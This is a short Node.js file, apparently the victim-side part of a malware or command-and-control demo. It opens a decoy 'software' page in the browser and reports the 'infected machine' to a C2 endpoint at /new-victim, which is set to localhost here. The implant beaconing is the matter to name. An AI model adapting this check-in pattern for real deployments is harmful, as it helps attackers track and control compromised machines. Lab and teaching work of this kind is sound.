const path = require("path");
const express = require("express");
const getPort = require("get-port");
const open = require("open");
const app = express();
var http = require("http");
const server = http.createServer(app);
const io = require("socket.io")(server);


//Notify command and control of the infected machine
const connectToCAndC = (host) => {
    // send compromised machine address to command and control
    const options = {
        //command and control server
        hostname: "localhost",
        port: '3001',
        path: `/new-victim?host=${host}`,
        method: "GET",
    };
    let req = http.request(options, (res) => {
        console.log(
            `Victim attempted to initial connection with command and control status code: ${res.statusCode}`
        );
    });

    req.on('error', error => {
        console.log(error);
    });

    req.end();
};

(async function() {
    // find available port 3000 by default
    const port = await getPort({ port: 3000 });
    const host = `http://127.0.0.1:${port}`;

    //Setup server
    app.use("/resources", express.static(path.join(__dirname, "/")));
    app.get("/", function(req, res) {
        res.sendFile(path.join(__dirname + "/software.html"));
    });

    //Setup socket to update site with commands being run
    io.on("connection", (socket) => {
        console.log("connection established");
    });

    // start the server
    server.listen(port, async() => {
        await open(`${host}`);
        console.log(`Running on port ${port}`);
        //connect to command and control
        connectToCAndC(host);
    });


})();